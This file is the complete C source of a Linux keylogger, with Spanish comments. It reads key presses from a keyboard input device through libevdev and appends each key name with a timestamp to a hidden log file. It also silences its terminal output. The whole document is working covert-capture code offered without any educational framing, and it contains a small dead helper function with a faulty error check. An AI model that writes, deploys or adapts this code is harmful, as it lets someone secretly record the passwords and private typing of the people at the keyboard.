/*
@archkr0w
*/

#define _XOPEN_SOURCE 700
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <libevdev/libevdev.h>
#include <libevdev/libevdev-uinput.h>
#include <string.h> //necesario para usar el fakin strerror
#include <signal.h>
#include <limits.h> //para PATH_MAX
#include <time.h>   //para trabajar con fechas y horas

#define PATH "/home/tunmbrelol/Desktop/test.txt" //rutadondealojaeltxtameo
#define MAX_EVENTS 100 //ajusta el tamaño 

FILE *file;

void sigHandler(int signum)
{
    fclose(file);
    exit(0);
}

int writeEventsIntoFile(FILE *fd_out, struct input_event *events, size_t to_write)
{
    ssize_t written;
    do
    {
        written = fwrite(events, sizeof(struct input_event), to_write / sizeof(struct input_event), fd_out);
        if (written < 0) /*puede fallar con EPIPE (Si el servidor cerro el socket) o con EINTR si es interrumpido por una señal antes de que cualquier byte fuera escrito */
            return 0;    /*si es interrumpido por una señal despues de haber escrito al menos un byte, devuelve el numero de bytes escritos */
        events += written;
        to_write -= written * sizeof(struct input_event);
    } while (to_write > 0);
    return 1;
}

int main() {
    struct libevdev *dev;
    int fd;
    int rc = 1;

    //redirigir stdout a /dev/null para evitar la salida de teclas en la terminal
    freopen("/dev/null", "w", stdout);

    //abrir el dispositivo de entrada de teclado
    fd = open("/dev/input/event3", O_RDONLY); //reemplaza X con el número de tu dispositivo de teclado
    if (fd < 0) {
        perror("Cannot open input device");
        exit(1);
    }

    file = fopen(PATH, "a+");
    if (file == NULL) {
        perror("Cannot open log file");
        close(fd);
        exit(1);
    }

    //manejar señales para cerrar el archivo correctamente
    signal(SIGINT, sigHandler);
    signal(SIGTERM, sigHandler);

    dev = libevdev_new();
    if (!dev) {
        fprintf(stderr, "Cannot allocate libevdev structure\n");
        close(fd);
        fclose(file);
        exit(1);
    }

    rc = libevdev_set_fd(dev, fd);
    if (rc < 0) {
        fprintf(stderr, "Cannot set libevdev fd: %s\n", strerror(-rc));
        libevdev_free(dev);
        close(fd);
        fclose(file);
        exit(1);
    }

    while (1) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);

        if (rc == 0) {
            if (ev.type == EV_KEY && ev.value == 1) { 
                const char *keyname = libevdev_event_code_get_name(ev.type, ev.code);
                if (keyname && strncmp(keyname, "KEY_", 4) == 0) {
                    keyname += 4; 
                    //obtener la fecha y hora actual
                    time_t now;
                    struct tm *local_time;
                    char time_str[80];

                    time(&now);
                    local_time = localtime(&now);
                    strftime(time_str, sizeof(time_str), "[%Y-%m-%d %H:%M:%S] ", local_time);

                    //escribir la fecha/hora y la tecla presionada en el archivo
                    fprintf(file, "%s%s\n", time_str, keyname);
                    fflush(file);
                }
            }
        } else if (rc != LIBEVDEV_READ_STATUS_SUCCESS && rc != -EAGAIN) {
            fprintf(stderr, "Error reading event: %s\n", strerror(-rc));
            break;
        }
    }

    libevdev_free(dev);
    close(fd);
    fclose(file);
    return 0;
}

